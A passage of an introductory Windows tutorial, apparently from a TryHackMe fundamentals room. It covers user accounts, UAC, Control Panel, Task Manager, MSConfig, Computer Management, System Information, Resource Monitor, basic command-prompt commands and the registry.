+<p>Each user profile will have the same folders; a few of them are:</p>
+<p>Desktop</p>
+<p>Documents</p>
+<p>Downloads</p>
+<p>Music</p>
+<p>Pictures</p>
+<p>Another way to access this information, and then some, is using&nbsp;<strong>Local User and Group Management</strong>.&nbsp;</p>
+<p>Right-click on the Start Menu and click&nbsp;<strong>Run</strong>.&nbsp;Type&nbsp;lusrmgr.msc. See below</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image073.gif" alt="Afbeelding met tekst, binnen, elektronica, scherm
+
+Automatisch gegenereerde beschrijving"></figure>
+<p><strong>Note</strong>: The Run Dialog Box allows us to open items quickly.&nbsp;</p>
+<p>Back to lusrmgr, you should see two folders:&nbsp;<strong>Users</strong>&nbsp;and&nbsp;<strong>Groups</strong>.&nbsp;</p>
+<p>If you click on Groups, you see all the names of the local groups along with a brief description for each group.&nbsp;</p>
+<p>Each group has permissions set to it, and users are assigned/added to groups by the Administrator. When a user is assigned to a group, the user inherits the permissions of that group. A user can be assigned to multiple groups.</p>
+<p><strong>Note</strong>: If you click on&nbsp;<strong>Add someone else to this PC</strong>&nbsp;from&nbsp;<strong>Other users</strong>, it will open&nbsp;<strong>Local Users and Management</strong>.&nbsp;</p>
+<p>&nbsp;</p>
+<h2>User Account Control</h2>
+<p>The large majority of home users are logged into their Windows systems as local administrators. Remember from the previous task that any user with administrator as the account type can make changes to the system.</p>
+<p>A user doesn't need to run with high (elevated) privileges on the system to run tasks that don't require such privileges, such as surfing the Internet, working on a Word document, etc. This elevated privilege increases the risk of system compromise because it makes it easier for malware to infect the system. Consequently, since the user account can make changes to the system, the malware would run in the context of the logged-in user.</p>
+<p>To protect the local user with such privileges, Microsoft introduced&nbsp;<strong>User Account Control</strong>&nbsp;(UAC). This concept was first introduced with the short-lived&nbsp;<a href="https://en.wikipedia.org/wiki/Windows_Vista">Windows Vista</a>&nbsp;and continued with versions of Windows that followed.</p>
+<p><strong>Note</strong>:&nbsp;UAC&nbsp;(by default) doesn't apply for the built-in local administrator account.&nbsp;</p>
+<p>How does&nbsp;UAC&nbsp;work? When a user with an account type of administrator logs into a system, the current session doesn't run with elevated permissions. When an operation requiring higher-level privileges needs to execute, the user will be prompted to confirm if they permit the operation to run.&nbsp;</p>
+<p>Let's look at the program on the account you're currently logged into, the built-in administrator account—Right-click to view its Properties.</p>
+<p>In the Security tab, we can see the users/groups and their permissions to this file.&nbsp;Notice that the standard user is not listed.&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image075.png"></figure>
+<p>Log in as the standard user and try to install this program. To do this, you can remote desktop into the machine as the standard user account.&nbsp;</p>
+<p><strong>Note</strong>: You have the username and password for the standard user. It's visible in&nbsp;<code>lusrmgr.msc</code>.</p>
+<p>Before installing the program, notice the icon. Do you see the difference?&nbsp;When you're logged in as the standard user, the shield icon is on the program's default icon.&nbsp;See below.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image076.png"></figure>
+<p>This shield icon is an indicator that&nbsp;UAC&nbsp;will prompt to allow higher-level privileges to install the program.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image078.png"></figure>
+<p>Double-click the program, and you'll see the&nbsp;UAC&nbsp;prompt. Notice that the built-in administrator account is already set as the user name and prompts the account's password.&nbsp;See below.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image080.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>After some time, if a password is not entered, the&nbsp;UAC&nbsp;prompt disappears, and the program does not install.&nbsp;</p>
+<p>This feature reduces the likelihood of malware successfully compromising your system. You can read more about&nbsp;<a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works">UAC</a>&nbsp;here.</p>
+<p>&nbsp;</p>
+<h2>Settings and Control Panel</h2>
+<p>On a Windows system, the primary locations to make changes are the Settings menu and the Control Panel.</p>
+<p>For a long time, the Control Panel has been the go-to location to make system changes, such as adding a printer, uninstall a program, etc.&nbsp;</p>
+<p>The Settings menu was introduced in Windows 8, the first Windows operating system catered to touch screen tablets, and is still available in Windows 10. As a matter of fact, the Settings menu is now the primary location a user goes to if they are looking to change the system.&nbsp;</p>
+<p>There are similarities and differences between the two menus. Below are screenshots of each.</p>
+<p><strong>Settings</strong>:</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image082.png"></figure>
+<p><strong>Control Panel</strong>:&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image084.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p><br><br>&nbsp;</p>
+<p><strong>Note</strong>: The icons for Settings might be different in the version of Windows on your personal device.&nbsp;</p>
+<p>Both can be accessed from the Start Menu.&nbsp;See below.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image086.png"></figure>
+<p>Control Panel is the menu where you will access more complex settings and perform more complex actions. In some cases, you can start in Settings and end up in the Control Panel.</p>
+<p>For example, in Settings, click on&nbsp;<strong>Network &amp; Internet</strong>. From here, click on&nbsp;<strong>Change adapter options</strong>.&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image088.png"></figure>
+<p>Notice that the next window that pops up is from the Control Panel.&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image090.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>If you're unclear which to open if you wish to change a setting, use the Start menu and search for it.&nbsp;</p>
+<p>In the example below, the search was 'wallpaper.' Notice that few results were returned.&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image092.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>If we click on the Best match, a window to the Settings menu appears to make changes to the wallpaper.&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image094.png"></figure>
+<p>&nbsp;</p>
+<h2>Taskmanager</h2>
+<p>The last subject that will be touched on in this module is the&nbsp;<strong>Task Manager</strong>.</p>
+<p>The Task Manager provides information about the applications and processes currently running on the system. Other information is also available, such as how much CPU and RAM are being utilized, which falls under&nbsp;<strong>Performance</strong>.&nbsp;</p>
+<p>You can access the Task Manager by right-clicking the taskbar.&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image096.png"></figure>
+<p>Task Manager will open in Simple View and won't show much information.&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image098.png" alt="Afbeelding met tekst, schermafbeelding, watervogel
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Click on&nbsp;<code>More details</code>, and the view changes.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image100.png" alt="Afbeelding met tafel
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>You can refer to this&nbsp;<a href="https://www.howtogeek.com/405806/windows-task-manager-the-complete-guide/">blog post</a>&nbsp;for more detailed information about the Task Manager.</p>
+<p>If you wish to learn more about the core Windows processes and what each process is responsible for, visit the&nbsp;<a href="https://tryhackme.com/jr/btwindowsinternals">Core Windows Processes room</a>.&nbsp;</p>
+<p>&nbsp;</p>
+<h2>System configuration</h2>
+<p>The&nbsp;<strong>System Configuration</strong>&nbsp;utility (<code>MSConfig</code>) is for advanced troubleshooting, and its main purpose is to help diagnose startup issues.&nbsp;</p>
+<p>Reference the following document&nbsp;<a href="https://docs.microsoft.com/en-us/troubleshoot/windows-client/performance/system-configuration-utility-troubleshoot-configuration-errors">here&nbsp;</a>for more information on the System Configuration utility.&nbsp;</p>
+<p>There are several methods to launch System Configuration. One method is from the Start Menu.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image102.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p><strong>Note</strong>: You need local administrator rights to open this utility.&nbsp;</p>
+<p>The utility has five tabs across the top. Below are the names for each tab. We will briefly cover each tab in this task.&nbsp;</p>
+<p>General</p>
+<p>Boot</p>
+<p>Services</p>
+<p>Startup</p>
+<p>Tools</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image104.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>In the&nbsp;<strong>General</strong>&nbsp;tab, we can select what devices and services for Windows to load upon boot. The options are:&nbsp;<strong>Normal</strong>,&nbsp;<strong>Diagnostic</strong>, or&nbsp;<strong>Selective</strong>.&nbsp;</p>
+<p>In the&nbsp;<strong>Boot</strong>&nbsp;tab, we can define various boot options for the Operating System.&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image106.png"></figure>
+<p>The&nbsp;<strong>Services</strong>&nbsp;tab lists all services configured for the system regardless of their state (running or stopped).&nbsp;A service is a special type of application that runs in the background.&nbsp;&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image108.png" alt="Afbeelding met tafel
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>In the&nbsp;<strong>Startup</strong>&nbsp;tab, you won't see anything interesting in the attached VM.&nbsp; Below is a screenshot of the Startup tab for&nbsp;<strong>MSConfig</strong>&nbsp;from my local machine.&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image110.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>As you can see, Microsoft advises using&nbsp;<strong>Task Manager (</strong><code>taskmgr</code><strong>)&nbsp;</strong>to manage (enable/disable) startup items. The System Configuration utility is&nbsp;<strong>NOT</strong>&nbsp;a startup management program.&nbsp;</p>
+<p><strong>Note</strong>: If you open Task Manager for the attached&nbsp;VM, you will notice that Task Manager doesn't show a Startup tab.&nbsp;</p>
+<p>There is a list of various utilities (tools) in the Tools tab that we can run to configure the operating system further. There is a brief description of each tool to provide some insight into what the tool is for.&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image112.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Notice the&nbsp;<strong>Selected command</strong>&nbsp;section. The information in this textbox will change per tool.</p>
+<p>&nbsp;</p>
+<h2>Change UAC settings</h2>
+<p>&nbsp;</p>
+<p>We're continuing with Tools that are available through the&nbsp;<strong>System Configuration</strong>&nbsp;panel.</p>
+<p><strong>User Account Control</strong>&nbsp;(UAC) was covered in great detail in&nbsp;<a href="https://tryhackme.com/room/windowsfundamentals1xbx">Windows Fundamentals 1</a>.&nbsp;</p>
+<p>The&nbsp;UAC&nbsp;settings can be changed or even turned off entirely (not recommended).</p>
+<p>You can move the slider to see how the setting will change the&nbsp;UAC&nbsp;settings and Microsoft's stance on the setting.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image114.png"></figure>
+<h2>Computer management</h2>
+<p>The&nbsp;Computer Management&nbsp;(<code>compmgmt</code>)&nbsp;utility has three primary sections:&nbsp;System Tools,&nbsp;Storage, and&nbsp;Services and Applications.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image116.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p><strong>System Tools</strong></p>
+<p>Let's start with&nbsp;Task Scheduler. Per Microsoft, with Task Scheduler, we can create and manage common tasks that our computer will carry out automatically at the times we specify.</p>
+<p>A task can run an application, a script, etc., and tasks can be configured to run at any point. A task can run at log in or at log off. Tasks can also be configured to run on a specific schedule, for example, every five mins.</p>
+<p>To create a basic task, click on&nbsp;<code>Create Basic Task</code>&nbsp;under&nbsp;Actions&nbsp;(right pane).</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image118.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Next is&nbsp;Event Viewer.</p>
+<p>Event Viewer allows us to view events that have occurred on the computer. These records of events can be seen as an audit trail that can be used to understand the activity of the computer system. This information is often used to diagnose problems and investigate actions executed on the system.&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image120.png"></figure>
+<p>Event Viewer has three panes.</p>
+<p>The pane on the left provides a hierarchical tree listing of the event log providers. (as shown in the image above)</p>
+<p>The pane in the middle will display a general overview and summary of the events specific to a selected provider.</p>
+<p>The pane on the right is the actions pane.</p>
+<p>There are five types of events that can be logged. Below is a table from&nbsp;<a href="https://docs.microsoft.com/en-us/windows/win32/eventlog/event-types">docs.microsoft.com</a>&nbsp;providing a brief description for each.</p>
+<p>&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image122.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>&nbsp;</p>
+<p>The standard logs are visible under&nbsp;Windows Logs. Below is a table from&nbsp;<a href="https://docs.microsoft.com/en-us/windows/win32/eventlog/eventlog-key">docs.microsoft.com</a>&nbsp;providing a brief description for each.</p>
+<p>&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image124.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>&nbsp;</p>
+<p>For more information about Event Viewer and Event Logs, please refer to the Windows Event Log&nbsp;<a href="https://tryhackme.com/room/windowseventlogs">room</a>.&nbsp;</p>
+<p>Shared Folders&nbsp;is where you will see a complete list of shares and folders shared that others can connect to.&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image126.png" alt="Afbeelding met tafel
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>In the above image, under Shares, are the default share of Windows, C$, and default remote administration shares created by Windows, such as ADMIN$.&nbsp;</p>
+<p>As with any object in Windows, you can right-click on a folder to view its properties, such as Permissions (who can access the shared resource).&nbsp;</p>
+<p>Under&nbsp;Sessions, you will see a list of users who are currently connected to the shares. In this&nbsp;VM, you won't see anybody connected to the shares.</p>
+<p>All the folders and/or files that the connected users access will list under&nbsp;Open Files.</p>
+<p>The&nbsp;Local Users and Groups&nbsp;section you should be familiar with from&nbsp;<a href="https://tryhackme.com/room/windowsfundamentals1xbx">Windows Fundamentals 1</a>&nbsp;because it's&nbsp;<code>lusrmgr.msc</code>.</p>
+<p>In&nbsp;Performance, you'll see a utility called&nbsp;Performance Monitor&nbsp;(<code>perfmon</code>).</p>
+<p>Perfmon is used to view performance data either in real-time or from a log file. This utility is useful for troubleshooting performance issues on a computer system, whether local or remote.&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image128.png" alt="Afbeelding met tafel
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Device Manager&nbsp;allows us to view and configure the hardware, such as disabling any hardware attached to the computer.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image130.png"></figure>
+<p>&nbsp;</p>
+<p><strong>Storage&nbsp;&nbsp;</strong></p>
+<p>Under Storage is&nbsp;Windows Server Backup&nbsp;and&nbsp;Disk Management. We'll only look at Disk Management in this room.</p>
+<p>Note: Since the virtual machine is a Windows Server operating system, there are utilities available that you will typically not see in Windows 10.&nbsp;&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image132.png"></figure>
+<p>Disk Management is a system utility in Windows that enables you to perform advanced storage tasks.&nbsp;&nbsp;Some tasks are:</p>
+<p>Set up a new drive</p>
+<p>Extend a partition</p>
+<p>Shrink a partition</p>
+<p>Assign or change a drive letter (ex.&nbsp;E:)&nbsp;</p>
+<p>Services and Applications</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image134.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Recall from the previous task; a&nbsp;service is a special type of application that runs in the background. Here you can do more than enable and disable a service, such as view the Properties for the service.&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image136.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>WMI Control configures and controls the&nbsp;Windows Management Instrumentation&nbsp;(WMI) service.</p>
+<p>Per Wikipedia, "<i>WMI allows scripting languages (such as VBScript or Windows PowerShell) to manage Microsoft Windows personal computers and servers, both locally and remotely. Microsoft also provides a command-line interface to WMI called Windows Management Instrumentation Command-line (WMIC).</i>"</p>
+<p>Note: The WMIC tool is deprecated in Windows 10, version 21H1. Windows PowerShell supersedes this tool for WMI.&nbsp;</p>
+<p>&nbsp;</p>
+<h2>System Information</h2>
+<p>We're continuing with Tools that are available through the&nbsp;<strong>System Configuration</strong>&nbsp;panel.</p>
+<p>What is the&nbsp;<strong>System Information</strong>&nbsp;(<code>msinfo32</code>) tool?</p>
+<p>Per Microsoft, "<i>Windows includes a tool called Microsoft System Information (Msinfo32.exe).&nbsp; This tool gathers information about your computer and displays a comprehensive view of your hardware, system components, and software environment, which you can use to diagnose computer issues.</i>"</p>
+<p>The&nbsp; information in&nbsp;<strong>System Summary</strong>&nbsp;is divided into three sections:</p>
+<p><strong>Hardware Resources</strong></p>
+<p><strong>Components</strong></p>
+<p><strong>Software Environment</strong></p>
+<p>System Summary will display general technical specifications for the computer, such as processor brand and model.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image138.png" alt="Afbeelding met tafel
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>The information displayed in&nbsp;<strong>Hardware Resources</strong>&nbsp;is not for the average computer user. If you want to learn more about this section, refer to the official Microsoft&nbsp;<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/hardware-resources#:~:text=Hardware%20resources%20are%20the%20assignable,of%20bus%2Drelative%20memory%20addresses.">page</a>.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image140.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Under&nbsp;<strong>Components</strong>, you can see specific information about the hardware devices installed on the computer. Some sections don't show any information, but some sections do, such as&nbsp;<strong>Display</strong>&nbsp;and&nbsp;<strong>Input</strong>.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image142.png" alt="Afbeelding met tafel
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>In the&nbsp;<strong>Software Environmen</strong>t section, you can see information about software baked into the operating system and software you have installed. Other details are visible in this section as well, such as the&nbsp;<strong>Environment Variables</strong>&nbsp;and&nbsp;<strong>Network Connections</strong>.&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image143.png" alt="Afbeelding met tafel
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Recall from the&nbsp;<a href="https://tryhackme.com/room/windowsfundamentals1xbx">Windows Fundamentals 1 room&nbsp;</a>(The Windows\System32 Folder task) where&nbsp;<strong>Environment Variables</strong>&nbsp;was briefly touched on.&nbsp;</p>
+<p>Per&nbsp;<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_variables?view=powershell-7.1">Microsoft</a>, "<i>Environment variables store information about the operating system environment. This information includes details such as the operating system path, the number of processors used by the operating system, and the location of temporary folders.</i></p>
+<p><i>The environment variables store data that is used by the operating system and other programs. For example, the WINDIR environment variable contains the location of the Windows installation directory. Programs can query the value of this variable to determine where Windows operating system files are located</i>".</p>
+<p>Click on&nbsp;<code>Environment Variables</code>&nbsp;to see the assigned values for the virtual machine.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image145.png" alt="Afbeelding met tafel
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Another method to view environment variables is&nbsp;<code>Control Panel &gt; System and Security &gt; System &gt; Advanced system settings &gt; Environment Variables</code>&nbsp;<strong>OR</strong>&nbsp;<code>Settings &gt; System &gt; About &gt; system info &gt; Advanced system settings &gt; Environment Variables</code>.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image147.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>The detour is over. Let's redirect our attention back to&nbsp;<code>msinfo32</code>&nbsp;and pick up where we left off.</p>
+<p>Towards the very bottom of this utility, there is a search bar. Please give it a go.&nbsp;Select Components and search for&nbsp;<code>IP address</code>.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image149.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>&nbsp;</p>
+<h2>Resource monitor</h2>
+<p>What is&nbsp;<strong>Resource Monitor</strong>&nbsp;(resmon)?</p>
+<p>Per Microsoft, "<i>Resource Monitor displays per-process and aggregate CPU, memory, disk, and network usage information, in addition to providing details about which processes are using individual file handles and modules. Advanced filtering allows users to isolate the data related to one or more processes (either applications or services), start, stop, pause, and resume services, and close unresponsive applications from the user interface. It also includes a process analysis feature that can help identify deadlocked processes and file locking conflicts so that the user can attempt to resolve the conflict instead of closing an application and potentially losing data.</i>"</p>
+<p>As some of the other tools mentioned in this room, this utility is geared primarily to advanced users who need to perform advanced troubleshooting on the computer system.</p>
+<p>In the Overview tab, Resmon has four sections:</p>
+<p>CPU, Disk, Network and Memory</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image151.png"></figure>
+<p>The same four sections have corresponding tabs across the top.&nbsp;See below.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image153.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Note that each tab has additional information for each. An image is shown below for each tab.&nbsp;</p>
+<p><strong>CPU</strong></p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image155.png"></figure>
+<p><strong>Memory</strong></p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image157.png"></figure>
+<p><strong>Disk</strong></p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image159.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p><strong>Network</strong></p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image161.png"></figure>
+<p>Although not captured in any of the images above, Resource Monitor has a pane at the far right. This pane shows a graphical view in real-time for each section.&nbsp;</p>
+<p><strong>Note</strong>: The information displayed in Resource Monitor will be different for you compared to the images above.</p>
+<p>&nbsp;</p>
+<h2>Command Prompt</h2>
+<p>The command prompt (<code>cmd</code>) can seem daunting at first, but it's really not that bad once you understand how to interact with it.&nbsp;</p>
+<p>In early operating systems, the command line was the sole way to interact with the operating system.</p>
+<p>When the GUI (graphical user interface) was introduced, it allowed users to perform complex tasks with a few clicks of a button instead of entering commands in the command prompt.&nbsp;</p>
+<p>Even though the GUI is the primary way to interact with the operating system, a computer user can still interact via the command prompt.&nbsp;</p>
+<p>In this task, we'll only cover a few commands that a computer user can run in the command prompt to obtain information about the computer system.</p>
+<p>Let's start with a few simple commands, such as&nbsp;<code>hostname</code>&nbsp;and&nbsp;<code>whoami</code>.</p>
+<p>The command&nbsp;<strong>hostname</strong>&nbsp;will output the computer name.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image162.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>The command&nbsp;<strong>whoami</strong>&nbsp;will output the name of the logged-in user.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image164.png"></figure>
+<p>Next, let's look at some commands that are useful when troubleshooting.</p>
+<p>A command used often is&nbsp;<code>ipconfig</code>. This command will show the network address settings for the computer.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image166.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Each command will have a help manual to explain the expected syntax to execute the command properly, along with any additional parameters that can be added to the command to expand its execution.</p>
+<p>A&nbsp; command to retrieve the help manual for a command is&nbsp;<code>/?</code>.</p>
+<p>For example, to see the help manual for&nbsp;<strong>ipconfig</strong>, you can use the following command:&nbsp;<code>ipconfig /?</code></p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image168.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p><strong>Note</strong>: To clear the command prompt screen, the command is&nbsp;<code>cls</code>.&nbsp;</p>
+<p>The next command is&nbsp;<code>netstat</code>. Per the help manual, this command will display protocol statistics and current TCP/IP network connections.&nbsp;</p>
+<p>&nbsp;</p>
+<p>In the above image, the line within the red box shows us an example syntax for the command.&nbsp;</p>
+<p>The structure tells us the&nbsp;<strong>netstat</strong>&nbsp;command can be run alone or with parameters, such as&nbsp;<code>-a</code>,&nbsp; <code>-b</code>,&nbsp; <code>-e</code>, etc.&nbsp;</p>
+<p>When any of the parameters are appended to the root command,&nbsp;<strong>netstat</strong>&nbsp;in this case, the output changes. Play with a few to see for yourself.&nbsp;</p>
+<p>The&nbsp;<code>net</code>&nbsp;command is primarily used to manage network resources.&nbsp;This command supports sub-commands.</p>
+<p>If you type&nbsp;<strong>net</strong>&nbsp;without a sub-command, the output will show the syntax for the root command showing a few of the sub-commands you can use.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image170.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>For the net command, to display the help manual&nbsp;<code>/?</code>&nbsp;will not work. In this case, you need to use different syntax, which is&nbsp;<code>net help</code>.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image172.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>So, if you wish to see the help information for&nbsp;<code>net user</code>&nbsp;, the command is&nbsp;<code>net help user</code>.&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image174.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>You can use the same command to view the help information for other useful&nbsp;<strong>net</strong>&nbsp;sub-commands, such as&nbsp;<strong>localgroup</strong>,&nbsp;<strong>use</strong>,&nbsp;<strong>share</strong>, and&nbsp;<strong>session</strong>.&nbsp;</p>
+<p>Refer to the following link to see a comprehensive list of commands you can execute in the command prompt&nbsp;<a href="https://ss64.com/nt/">here</a>.&nbsp;</p>
+<p>&nbsp;</p>
+<h2>Registry Editor</h2>
+<p>The&nbsp;<strong>Windows Registry</strong>&nbsp;(per Microsoft) is a&nbsp;central hierarchical database used to store information necessary to configure the system for one or more users, applications, and hardware devices.</p>
+<p>The registry contains information that Windows continually references during operation, such as:</p>
+<p>Profiles for each user</p>
+<p>Applications installed on the computer and the types of documents that each can create</p>
+<p>Property sheet settings for folders and application icons</p>
+<p>What hardware exists on the system</p>
+<p>The ports that are being used.</p>
+<p><strong>Warning</strong>: The registry is for advanced computer users. Making changes to the registry can affect normal computer operations.&nbsp;</p>
+<p>There are various ways to view/edit the registry. One way is to use the&nbsp;<strong>Registry Editor</strong>&nbsp;(<code>regedit</code>).</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image176.png"></figure>
+<p>Refer to the following Microsoft documentation&nbsp;<a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/performance/windows-registry-advanced-users">here</a>&nbsp;to learn more about the Windows Registry.&nbsp;</p>
+<p>&nbsp;</p>
+<h2>Windows utilities</h2>
+<p>Windows comes with a variety of utility tools. Some of them are:</p>
+<ul>
+  <li>Computer Management</li>
+  <li>Local Security Policy</li>
+  <li>Disk Cleanup</li>
+  <li>Registry Editor</li>
+  <li>Command-line tools</li>
+  <li>Registry Editor (Regedit)</li>
+</ul>
+<p>Let's break each of them down and see their usage and why they are important.</p>
+<p>&nbsp;</p>
+<p><strong>Computer Management</strong></p>
+<p>Computer Management contains more tools such as:</p>
+<ul>
+  <li>Task Scheduler</li>
